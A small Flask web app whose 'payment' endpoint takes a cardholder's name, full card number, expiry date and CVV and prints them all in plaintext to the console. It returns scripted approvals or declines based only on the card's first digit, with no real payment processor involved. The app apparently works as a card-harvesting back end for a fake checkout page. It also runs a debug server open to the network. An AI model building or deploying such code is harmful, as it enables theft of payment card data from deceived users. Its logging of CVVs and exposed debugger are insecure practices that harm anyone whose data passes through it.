from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/odeme-yap', methods=['POST'])
def odeme_yap():
    data = request.json
    tutar = data.get('tutar', '0.00')
    
    print("\n" + "="*40)
    print("📥 [NEW DYNAMIC USD PAYMENT]")
    print(f"👤 Account Holder : {data.get('isim')}")
    print(f"💳 Card Number    : {data.get('kart_no')}")
    print(f"📅 Expiry Date   : {data.get('skt')}")
    print(f"🔒 CVV Code       : {data.get('cvv')}")
    print(f"💵 Requested Amt  : ${tutar} USD")
    print("="*40 + "\n")

    if not data.get('isim') or not data.get('kart_no') or not data.get('skt') or not data.get('cvv'):
        return jsonify({
            "durum": "HATA",
            "mesaj": "❌ Tüm alanları doldurmanız zorunludur!"
        })

    kart_no = data.get('kart_no', '').replace(" ", "")

    if len(kart_no) != 16:
        return jsonify({
            "durum": "HATA",
            "mesaj": "❌ Invalid Card Number! (16 digits required)"
        })
    
    if kart_no.startswith("4"): 
        return jsonify({
            "durum": "HATA",
            "mesaj": f"❌ Transaction Declined: ${tutar} (Insufficient Funds / Card Empty)"
        })
    
    if kart_no.startswith("5"):
        return jsonify({
            "durum": "BAŞARILI",
            "mesaj": f"✅ Payment of ${tutar} Approved Successfully!"
        })

    return jsonify({
        "durum": "HATA",
        "mesaj": "❌ Transaction Declined: Invalid card or zero balance."
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

